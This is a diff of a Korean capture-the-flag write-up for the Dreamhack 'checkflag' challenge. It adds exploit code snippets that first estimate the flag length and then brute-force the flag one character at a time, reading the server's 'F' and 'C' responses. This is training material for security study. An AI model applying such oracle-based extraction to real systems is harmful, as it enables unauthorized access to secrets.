@@ -31,7 +31,7 @@ dreamhack checkflag
 * 한 글자씩 줄여가며 이 과정을 반복하며 플래그를 거꾸로 한 글자씩 알아낼 수 있다.
 
 
-### 익스플로잇 코드
+## 익스플로잇 코드
 
 
 ```python
@@ -69,6 +69,10 @@ for i in range(flag_len - 4):
 print('DH{' + found_flag.decode() + '}')
 ```
 
+플래그의 길이 추정 → 플래그 내용 브루트포싱의 두 단계로 나누어 작성했다.
+
+### flag_len 찾기 (플래그의 길이 추정)
+
 ```python
 for length in range(0x3f, 0, -1):  # 0x3f = 63부터 1까지 감소
 ```
@@ -87,7 +91,55 @@ payload 구조:
     → 총 64바이트 입력 후 동일한 패턴을 뒤에 붙임.
 
 
+```python
+p.sendafter(b'flag?', payload)
+if ord('F') in p.recvuntil(b'!\n'):  # 결과에 'F' 포함 시 길이 맞음
+```
 
+* 응답에 'F' ("FLAG" 또는 "FLAG format correct") 문자가 포함되면 해당 길이가 유효
+* 이 때의 길이 + 1이 실제 flag 길이로 판단됨
+
+
+
+### flag 브루트포싱
+
+* flag는 DH{...} 형식이니까 나머지 flag_len - 4 문자만 브루트포싱하면 된다.
+* 뒤에서부터 채우기 (found_flag는 뒤에서부터 쌓임) + 비교 시 "입력 + '}'" 구조로 끝이 맞는지 확인
+
+
+#### 루프
+
+```python
+for i in range(flag_len - 4):  # 남은 flag 문자 수만큼 반복
+    for c in range(0x20, 0x7f):  # 아스키 문자 범위 
+```
+
+```python
+test_payload = b'A' * (flag_len - 2 - i) + chr(c).encode() + found_flag + b'}'
+```
+
+* 앞쪽: A로 남은 길이 채움 (공격 벡터 삽입 위치 조정)
+* 중간: 현재 시도 중인 문자
+* 뒤쪽: 지금까지 알아낸 flag 일부 + '}'
+
+```python
+payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + b'A' * (flag_len - 2 - i)
+```
+
+전체 payload는 앞에서 만든 입력을 64바이트로 정렬하고, 뒤쪽에 비교용 A 채운다.
+
+```python
+if ord('C') in p.recvuntil(b'!\n'):  # 응답에 'C' 포함 시 해당 문자가 정답
+    found_flag = chr(c).encode() + found_flag  # 찾은 문자를 앞에 붙임
+```
+
+* 'C'가 들어오면 맞는 문자로 간주하고 found_flag에 추가.
+* 이렇게 하여 뒤에서부터 한 글자씩 완성됨.
+
+-----------------------------------
 
 <img width="432" height="57" alt="image" src="https://github.com/user-attachments/assets/ae355a17-496b-4c0b-838a-e2843ca2ded6" />
 
+
+
+플래그를 이렇게 구할 수 있다.
